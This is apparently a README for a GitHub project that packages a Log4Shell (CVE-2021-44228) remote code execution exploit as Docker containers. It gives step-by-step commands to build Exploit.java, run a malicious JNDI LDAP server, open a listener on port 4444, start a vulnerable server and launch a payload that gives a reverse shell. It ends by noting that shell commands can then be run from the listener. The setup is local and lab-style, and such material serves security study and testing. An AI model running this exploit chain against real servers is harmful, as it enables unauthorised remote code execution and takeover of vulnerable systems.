# CVE-2021-44228 (Apache Log4j Remote Code Execution）

> [all log4j-core versions >=2.0-beta9 and <=2.14.1](https://logging.apache.org/log4j/2.x/security.html)

## Requirements

Java 8 required.

## Usage

Download this project.

```
git clone https://github.com/kimberleyhallifax/log4shell.git
```

Build project.

```
./build.sh

# Runs the following commands
#   cd containers/httpserver/
#   javac Exploit.java
#   cd ../..
#   docker-compose build
```

Run vulnerable jndi LDAP server.

```
cd containers/ldap/
./run.sh

# Runs the following command
#   docker run --rm -it --name log4shell_ldap -p 1389:1389 log4shell_ldap
```

Create listener on port 4444.

```
cd containers/listener
./run.sh

# Runs the following command
#   docker run --rm -it --name log4shell_listener -p 4444:4444 log4shell_listener
```

Run vulnerable server.

```
cd containers/CVE/
./run.sh

# Runs the following command
#   docker run --rm -it --name log4shell_cve -p 9876:9876 log4shell_cve
```

Run payload to execute reverse shell connection to our listener.

```
cd containers/exploit/

# Runs the following command
#   docker run --rm -it --name log4shell_exploit log4shell_exploit
```

You will now be able to execute shell commands from your listener.

## Credits

https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce
https://github.com/mbechler/marshalsec